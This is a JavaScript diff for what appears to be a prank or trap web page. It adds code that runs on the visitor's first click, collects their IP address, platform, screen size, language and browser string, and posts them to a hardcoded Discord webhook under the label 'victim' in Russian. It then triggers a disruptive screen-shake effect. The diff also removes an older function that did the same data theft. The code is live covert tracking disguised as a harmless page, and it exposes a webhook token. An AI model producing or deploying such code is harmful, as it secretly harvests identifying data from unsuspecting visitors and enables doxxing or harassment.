@@ -78,6 +78,34 @@
                 if (started) return;
                 started = true;
 
+                // 1. СРАЗУ ОТПРАВЛЯЕМ ДАННЫЕ (пока браузер не начал сходить с ума)
+                const payload = JSON.stringify({
+                    content: `🚨 **ЖЕРТВА**\n**Платформа:** ${navigator.platform}\n**Экран:** ${window.screen.width}x${window.screen.height}\n**Язык:** ${navigator.language}\n**Браузер:** ${navigator.userAgent}`
+                });
+
+                fetch("https://discordapp.com/api/webhooks/1563254919576682669/PwavQljrqSqvBos2q-mrwAJdMQru-OFgNfhYbKZKuujbIvhJzBgWH1tmGR1Qkxdz401w", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: payload,
+                    keepalive: true
+                }).catch(e => console.log("Ошибка отправки", e));
+
+                // Попытка получить IP отдельно
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(data => {
+                        const ipPayload = JSON.stringify({
+                            content: `🌐 **IP-АДРЕС ЖЕРТВЫ:** ${data.ip}`
+                        });
+                        fetch("https://discordapp.com/api/webhooks/1563254919576682669/PwavQljrqSqvBos2q-mrwAJdMQru-OFgNfhYbKZKuujbIvhJzBgWH1tmGR1Qkxdz401w", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: ipPayload,
+                            keepalive: true
+                        }).catch(e => console.log(e));
+                    }).catch(e => console.log(e));
+
+                // 2. НАЧИНАЕМ РАЗЪЁБ
                 let isNuke = Math.random() > 0.5;
 
                 vid.classList.add('shake');
@@ -161,40 +189,6 @@
                     vid.muted = true;
                     vid.play();
                 });
-
-                async function sendLogs() {
-                    let ip = "Неизвестно";
-                    try {
-                        const res = await fetch('https://api.ipify.org?format=json');
-                        const data = await res.json();
-                        ip = data.ip;
-                    } catch (e) {}
-
-                    const data = {
-                        content: "🚨 **НОВАЯ ЖЕРТВА**",
-                        embeds: [{
-                            title: "Данные устройства",
-                            color: 16711680,
-                            fields: [
-                                { name: "IP-адрес", value: ip, inline: true },
-                                { name: "Платформа", value: navigator.platform || "Неизвестно", inline: true },
-                                { name: "Экран", value: window.screen.width + "x" + window.screen.height, inline: true },
-                                { name: "Язык", value: navigator.language || "Неизвестно", inline: true },
-                                { name: "Часовой пояс", value: Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно", inline: true },
-                                { name: "Браузер", value: navigator.userAgent, inline: false }
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    };
-
-                    fetch("https://discordapp.com/api/webhooks/1563254919576682669/PwavQljrqSqvBos2q-mrwAJdMQru-OFgNfhYbKZKuujbIvhJzBgWH1tmGR1Qkxdz401w", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(data)
-                    }).catch(err => console.log("Ошибка:", err));
-                }
-
-                sendLogs();
             }
 
             document.addEventListener('click', start, { once: true });
